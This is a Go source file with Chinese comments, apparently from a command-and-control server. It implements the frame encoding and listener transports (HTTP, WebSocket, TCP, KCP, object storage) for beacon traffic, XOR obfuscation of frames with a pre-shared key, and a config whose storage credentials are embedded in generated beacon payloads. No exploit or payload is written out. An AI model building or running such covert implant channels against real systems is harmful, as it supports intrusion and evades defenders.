package c2center

// 传输框架(契约 C2_CONTRACTS.md §18,Agent T):
//
//   - 处理核(processEnvelope,listener.go)传输无关:解密→session 解析→分发→加密;
//   - 帧格式按载体:
//       http(既有)/ws:body = base64(密文),与一期逐字节兼容;
//       tcp/kcp:4 字节 big-endian 长度 + 裸密文(nonce||ct,无 base64);
//       oss:无连接,对象即帧(transport_oss.go);
//   - kcp 可选预共享 key 混淆:帧字节(含 4B 长度头)与 key 循环 XOR,逐帧复位;
//     配置走 transport_config 的 psk 字段(transport_config_enc 密封,server 层解封);
//   - Conn 抽象帧式连接(tcp/kcp/ws/正向连接共用):ReadFrame/WriteFrame 均为「一帧
//     密文」,半包/粘包由实现消化;http 请求-响应语义天然一帧,不经 Conn。
//
// 本文件只放纯编解码与抽象;监听器启停在各 transport_*.go。

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"
)

// 监听器协议(与 schema c2_listeners.proto CHECK 对齐;https 与 DNS 系四期)。
const (
	ProtoHTTP = "http"
	ProtoWS   = "ws"
	ProtoTCP  = "tcp"
	ProtoKCP  = "kcp"
	ProtoOSS  = "oss"
)

// frameHeaderSize 是帧长度前缀字节数(4 字节 big-endian)。
const frameHeaderSize = 4

// frameMaxBytes 是单帧上限(与信道 HTTP body 上限一致,防超长帧打爆内存)。
const frameMaxBytes = MaxBodyBytes

// Conn 是传输无关的帧式连接(tcp/kcp 监听循环、ws、正向连接共用)。帧 = 一份信封
// 密文(nonce||ct);帧分隔按载体(http base64 body / tcp+kcp 4B 长度前缀 / ws 消息)。
type Conn interface {
	// ReadFrame 读一帧密文;io.EOF 或超时表示对端关闭,实现自行消化半包/粘包。
	ReadFrame() ([]byte, error)
	// WriteFrame 写一帧密文。
	WriteFrame(frame []byte) error
	// Close 关闭连接(实现须幂等)。
	Close() error
}

// frameCtx 是处理核的一帧上下文(帧式连接才有 first;http 请求间无状态)。
type frameCtx struct {
	// first 是「是否本连接的首帧」:帧式连接首帧必须是 reg(§18)。
	first bool
	// bind 是正向连接:注册的会话在 meta.direction 标注 bind。
	bind bool
	// wait 是空队列时是否长轮询挂起(oss=false,对象队列无挂起语义)。
	wait bool
}

// frameReply 是处理核对一帧的裁决:code=0 时 body 是响应密文;否则为 HTTP 语义的
// 错误码与文本(http 传输直接映射;帧式传输除 200 外一律丢帧断连,不回明文)。
type frameReply struct {
	code   int
	msg    string
	body   []byte
	sessID int64 // 仅 reg 成功时携带(正向连接 API 用)
}

// ---- 帧编解码(4B big-endian 长度 + 裸密文;可选 XOR 混淆)----

// xorApply 对 buf[beg:] 从 key 的 off 起循环 XOR(off 是该帧内的全局偏移,含 4B 头)。
// key 为空 = 恒等变换。
func xorApply(buf []byte, key []byte, off int) {
	if len(key) == 0 {
		return
	}
	for i := range buf {
		buf[i] ^= key[(off+i)%len(key)]
	}
}

// readFrame 从 r 读一帧:4B 长度头 + 裸密文;key 非空时先按帧复位 XOR 解混淆。
// 半包(一次没到齐)与粘包(一次到多帧)由 io.ReadFull 天然消化。
func readFrame(r io.Reader, key []byte) ([]byte, error) {
	hdr := make([]byte, frameHeaderSize)
	if _, err := io.ReadFull(r, hdr); err != nil {
		return nil, err
	}
	xorApply(hdr, key, 0)
	n := binary.BigEndian.Uint32(hdr)
	if n == 0 || n > frameMaxBytes {
		return nil, fmt.Errorf("帧长度非法: %d", n)
	}
	frame := make([]byte, n)
	if _, err := io.ReadFull(r, frame); err != nil {
		return nil, err
	}
	xorApply(frame, key, frameHeaderSize)
	return frame, nil
}

// writeFrame 写一帧:4B 长度头 + 裸密文;key 非空时按帧复位 XOR 混淆。
func writeFrame(w io.Writer, key []byte, frame []byte) error {
	if len(frame) == 0 || len(frame) > frameMaxBytes {
		return fmt.Errorf("帧长度非法: %d", len(frame))
	}
	hdr := make([]byte, frameHeaderSize, frameHeaderSize+len(frame))
	binary.BigEndian.PutUint32(hdr, uint32(len(frame)))
	buf := append(hdr, frame...)
	xorApply(buf, key, 0)
	_, err := w.Write(buf)
	return err
}

// ---- net.Conn 适配(tcp/kcp 共用)----

// frameConn 是 net.Conn 上的 Conn 实现:4B 长度前缀帧,key 非空时逐帧 XOR 混淆
// (kcp 预共享 key;混淆位置逐帧复位,读写互不影响)。
type frameConn struct {
	conn net.Conn
	key  []byte

	writeMu sync.Mutex // Write 并发防护(正常使用是半双工锁步,防御为主)
}

func newFrameConn(c net.Conn, key []byte) *frameConn {
	return &frameConn{conn: c, key: append([]byte(nil), key...)}
}

func (c *frameConn) ReadFrame() ([]byte, error) { return readFrame(c.conn, c.key) }

func (c *frameConn) WriteFrame(frame []byte) error {
	c.writeMu.Lock()
	defer c.writeMu.Unlock()
	return writeFrame(c.conn, c.key, frame)
}

func (c *frameConn) Close() error { return c.conn.Close() }

// ---- 传输配置(transport_config_enc 密封 JSON 的明文形态)----

// TransportConfig 是监听器的传输配置(§18):
//   - oss:endpoint/bucket/access_key/secret_key 必填,prefix 可空(回落 url_path),
//     scan_seconds 可空(平台对象轮询间隔,默认 3s);
//   - kcp:psk 可空(空 = 不混淆);
//   - http/ws/tcp:无字段。
//
// AK/SK 经 server 层 secretbox 密封入库(transport_config_enc),接口与日志永不回显;
// 载荷生成时该配置会被写进 beacon 模板(oss 必须有,kcp 只取 psk)。
type TransportConfig struct {
	Endpoint    string `json:"endpoint"`
	Bucket      string `json:"bucket"`
	AccessKey   string `json:"access_key"`
	SecretKey   string `json:"secret_key"`
	Prefix      string `json:"prefix"`
	PSK         string `json:"psk"`
	ScanSeconds int    `json:"scan_seconds"`
	// PathStyle 为 true 时走 path-style(<host>/<bucket>/<key>,OSS 兼容的私有部署
	// 与测试用);默认 virtual-host(<bucket>.<host>/<key>,阿里云 OSS 标准)。签名
	// 两种风格完全相同。
	PathStyle bool `json:"path_style"`
}

// transportConfigStore 是 Store 的可选扩展:oss 监听器启动时取解封后的传输配置
// JSON(server 适配器在解封层实现,照 GetListenerKey 模式)。未实现 = 该部署
// 不支持 oss 传输(start 时报明确错误)。
type transportConfigStore interface {
	GetListenerTransportConfig(id int64) ([]byte, error)
}

// parseTransportConfig 解析传输配置 JSON(空串 = 零值)。
func parseTransportConfig(raw []byte) (*TransportConfig, error) {
	cfg := &TransportConfig{}
	if len(raw) == 0 {
		return cfg, nil
	}
	if err := json.Unmarshal(raw, cfg); err != nil {
		return nil, fmt.Errorf("传输配置 JSON 非法: %w", err)
	}
	return cfg, nil
}

// scanInterval 平台 oss 对象轮询间隔(配置 scan_seconds,缺省 3s,下限 1s)。
func (c *TransportConfig) scanInterval() time.Duration {
	sec := c.ScanSeconds
	if sec <= 0 {
		sec = 3
	}
	if sec < 1 {
		sec = 1
	}
	return time.Duration(sec) * time.Second
}

// ossPrefix oss 对象前缀(未配置回落监听器 url_path)。
func (c *TransportConfig) ossPrefix(urlPath string) string {
	p := strings.Trim(c.Prefix, "/")
	if p == "" {
		p = strings.Trim(urlPath, "/")
	}
	if p == "" {
		p = "artex"
	}
	return p
}
